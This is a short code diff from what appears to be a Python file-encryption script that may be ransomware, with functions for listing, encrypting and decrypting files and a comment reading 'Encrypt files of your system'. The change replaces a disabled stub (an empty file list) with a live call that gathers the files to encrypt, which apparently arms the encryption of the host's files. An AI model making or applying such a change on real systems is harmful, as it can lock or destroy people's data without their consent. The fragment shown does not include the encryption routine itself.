@@ -233,8 +233,8 @@ def decrypt_file(l_files, key):
         
 def main(): 
     args = parse_args()
-    #l_files = list_files(args)
-    l_files = []
+    l_files = list_files(args)
+    #l_files = []
 
     if args.encrypt == True:
         #Encrypt files of your system
